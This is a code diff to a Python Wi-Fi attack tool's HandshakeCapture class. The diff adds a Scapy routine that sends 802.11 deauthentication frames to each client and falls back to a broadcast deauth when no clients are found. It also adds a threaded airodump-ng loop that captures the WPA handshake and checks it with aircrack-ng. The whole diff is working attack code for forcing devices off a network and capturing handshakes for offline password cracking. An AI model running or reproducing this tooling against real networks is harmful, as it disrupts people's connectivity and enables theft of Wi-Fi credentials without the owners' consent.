@@ -23,6 +23,7 @@ from modules.utils import (
 from datetime import datetime
 from rich.table import Table
 from threading import Thread
+import shutil
 
 class HandshakeCapture:
     def __init__(self):
@@ -30,11 +31,12 @@ class HandshakeCapture:
         self.interface = None
         self.target_bssid = None
         self.target_channel = None
+        self.target_essid = None
         self.capture_file = None
         self.running = False
         self.handshake_captured = False
         self.networks = []
-        self.target_essid = None  # Add ESSID for cracking
+        self.deauth_count = 5  # Number of deauth packets to send per client
 
     def check_dependencies(self):
         tools = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'hcxpcapngtool', 'hcxdumptool']
@@ -421,139 +423,157 @@ class HandshakeCapture:
 
         return findings
 
-    def start_capture(self):
-        """Start the handshake capture process"""
-        if not self.check_dependencies():
-            return
+    def send_deauth(self, client_mac):
+        """Send deauth packets to a specific client"""
+        # Create deauth packet
+        deauth_packet = RadioTap() / Dot11(
+            type=0,
+            subtype=12,
+            addr1=client_mac,
+            addr2=self.target_bssid,
+            addr3=self.target_bssid
+        ) / Dot11Deauth(reason=7)
 
-        self.interface = self.get_interface()
-        if not self.interface:
-            return
-
-        # Setup monitor mode
-        mon_interface = self.setup_monitor_mode()
-        if not mon_interface:
-            self.console.print("[red]Failed to setup monitor mode. Make sure your wireless adapter supports monitor mode.[/red]")
-            return
-
-        self.interface = mon_interface
-
-        # Scan for networks
-        networks = self.scan_networks()
-        
-        if not networks:
-            self.console.print("[red]No networks found![/red]")
-            return
-
-        # Display found networks
-        self.console.print("\n[green]Networks found:[/green]")
-        for idx, network in enumerate(networks, 1):
-            self.console.print(
-                f"{idx}. BSSID: {network['BSSID']} | "
-                f"Channel: {network['Channel']} | "
-                f"ESSID: {network['ESSID']}"
-            )
-
-        # Get target selection
-        while True:
+        # Send packets
+        for _ in range(self.deauth_count):
             try:
-                choice = int(input("\nSelect target network number: ")) - 1
-                if 0 <= choice < len(networks):
-                    target = networks[choice]
-                    self.target_bssid = target['BSSID']
-                    self.target_channel = target['Channel']
-                    self.target_essid = target['ESSID']  # Store ESSID for cracking
-                    break
-            except ValueError:
-                pass
-            self.console.print("[red]Invalid choice. Please try again.[/red]")
+                sendp(deauth_packet, iface=self.interface, verbose=False)
+                time.sleep(0.1)  # Small delay between packets
+            except Exception as e:
+                self.console.print(f"[yellow]Error sending deauth packet: {str(e)}[/yellow]")
 
+    def capture_handshakes(self):
+        """Start airodump-ng to capture handshakes"""
         try:
-            self.running = True
-            
-            # Start capture process
+            # Start airodump-ng for handshake capture
             self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}')
-            
             capture_cmd = [
                 'airodump-ng',
                 '--bssid', self.target_bssid,
                 '--channel', self.target_channel,
-                '-w', self.capture_file,
+                '--write', self.capture_file,
+                '--output-format', 'pcap',
                 self.interface
             ]
             
-            capture_process = subprocess.Popen(
-                capture_cmd,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            
-            self.console.print("\n[cyan]Waiting for WPA handshake...[/cyan]")
-            self.console.print("[yellow]Sending deauthentication packets to speed up process...[/yellow]")
-            
-            while self.running and not self.handshake_captured:
-                # Send deauth packets
-                deauth_cmd = [
-                    'aireplay-ng',
-                    '--deauth', '5',
-                    '-a', self.target_bssid,
-                    self.interface
-                ]
+            with Progress() as progress:
+                task = progress.add_task("[cyan]Listening for handshakes...", total=None)
                 
-                subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                process = subprocess.Popen(
+                    capture_cmd,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
                 
-                # Check for handshake
-                if self.check_for_handshake():
-                    self.handshake_captured = True
-                    self.console.print("\n[green]Handshake captured successfully![/green]")
-                    self.console.print(f"[yellow]Capture file saved as: {self.capture_file}-01.cap[/yellow]")
-                    break
+                try:
+                    while self.running:
+                        # Check if handshake was captured
+                        if os.path.exists(f"{self.capture_file}-01.cap"):
+                            result = subprocess.run(
+                                ['aircrack-ng', f"{self.capture_file}-01.cap"],
+                                capture_output=True,
+                                text=True
+                            )
+                            
+                            if "1 handshake" in result.stdout:
+                                self.handshake_captured = True
+                                self.running = False
+                                self.console.print("\n[green]✓ WPA handshake successfully captured![/green]")
+                                break
+                        
+                        progress.update(task)
+                        time.sleep(1)
+                        
+                finally:
+                    process.terminate()
                     
-                time.sleep(2)
+        except Exception as e:
+            self.console.print(f"[red]Error during handshake capture: {str(e)}[/red]")
+
+    def start_capture(self):
+        """Main handshake capture process"""
+        try:
+            # Get wireless interface
+            self.interface = get_interface()
+            if not self.interface:
+                return
+
+            # Setup monitor mode
+            self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
+            self.interface = setup_monitor_mode(self.interface)
+            if not self.interface:
+                return
+
+            # Scan for networks
+            networks = scan_networks(self.interface)
+            if not networks:
+                return
+
+            # Select target
+            result = select_target(networks)
+            if not result:
+                return
+
+            self.target_bssid, self.target_channel, self.target_essid, clients = result
+
+            # Start capture process
+            self.running = True
             
-            capture_process.terminate()
-            
-            if self.handshake_captured:
-                self.console.print("\n[cyan]Would you like to attempt to crack the password? (y/n)[/cyan]")
-                if input().lower() == 'y':
-                    if not self.crack_cap_file():
-                        # If password cracking fails, gather detailed network info
-                        self.console.print("\n[yellow]Gathering detailed network information instead...[/yellow]")
-                        self.gather_network_info()
-                else:
-                    # If user doesn't want to crack, gather network info
-                    self.gather_network_info()
+            # Start handshake capture in a separate thread
+            capture_thread = threading.Thread(target=self.capture_handshakes)
+            capture_thread.daemon = True
+            capture_thread.start()
+
+            # Wait for airodump to start
+            time.sleep(2)
+
+            # Perform deauth attacks
+            if clients:
+                self.console.print("\n[yellow]Deauthenticating connected clients...[/yellow]")
+                with Progress() as progress:
+                    task = progress.add_task("[cyan]Sending deauth packets...", total=len(clients))
+                    
+                    for client in clients:
+                        self.send_deauth(client)
+                        progress.update(task, advance=1)
             else:
-                # If no handshake captured, still gather network info
-                self.gather_network_info()
-            
-        except KeyboardInterrupt:
-            self.console.print("\n[yellow]Capture stopped by user[/yellow]")
+                # If no clients found, try broadcast deauth
+                self.console.print("\n[yellow]No clients connected. Sending broadcast deauth...[/yellow]")
+                self.send_deauth("FF:FF:FF:FF:FF:FF")
+
+            self.console.print("\n[cyan]Listening for WPA handshake...[/cyan]")
+            self.console.print("[yellow]Press Ctrl+C to stop capture[/yellow]")
+
+            try:
+                while self.running:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                self.running = False
+
+            # Save results
+            if self.handshake_captured:
+                final_path = f"{self.capture_file}-01.cap"
+                save_path = get_data_path('handshakes', f'handshake_{datetime.now().strftime("%Y%m%d_%H%M%S")}.cap')
+                
+                # Move capture file to handshakes directory
+                if os.path.exists(final_path):
+                    shutil.move(final_path, save_path)
+                    self.console.print(f"\n[green]Handshake saved to: {save_path}[/green]")
+                    log_activity(f"Handshake captured - Target: {self.target_essid or self.target_bssid}")
+
+            # Cleanup
+            cleanup_temp_files()
+
+        except Exception as e:
+            self.console.print(f"[red]Error during handshake capture: {str(e)}[/red]")
         finally:
             self.running = False
-            # Cleanup
             try:
-                subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                if not self.handshake_captured:
-                    cleanup_temp_files()
+                subprocess.run(['airmon-ng', 'stop', self.interface],
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
             except:
                 pass
-
-    def check_for_handshake(self):
-        """Check if we've captured a handshake"""
-        try:
-            # Use aircrack-ng to check for handshake
-            result = subprocess.run(
-                ['aircrack-ng', f"{self.capture_file}-01.cap"],
-                capture_output=True,
-                text=True
-            )
-            
-            # If "1 handshake" appears in output, we've captured one
-            return "1 handshake" in result.stdout
-            
-        except Exception:
-            return False 
 
     def extract_hash(self):
         """Extract hashes from the capture file"""
